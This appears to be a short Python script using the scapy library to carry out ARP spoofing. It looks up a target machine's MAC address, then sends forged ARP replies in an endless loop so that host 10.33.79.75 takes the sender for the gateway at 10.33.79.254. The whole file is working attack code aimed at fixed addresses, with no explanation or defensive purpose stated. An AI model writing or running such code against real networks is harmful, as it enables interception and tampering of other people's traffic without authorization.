from scapy.all import *



def get_mac(ip): 
    arp_request = ARP(pdst = ip) 
    broadcast = Ether(dst ="ff:ff:ff:ff:ff:ff") 
    arp_request_broadcast = broadcast / arp_request 
    answered_list = srp(arp_request_broadcast, timeout = 5, verbose = False)[0] 
    return answered_list[0][1].hwsrc 


def spoof(target_ip, spoof_ip): 
    packet = ARP(op = 2, pdst = target_ip,  
                     hwdst = get_mac(target_ip),  
                               psrc = spoof_ip) 
  
    send(packet, loop=1, inter=1, verbose = False) 


spoof("10.33.79.75", "10.33.79.254")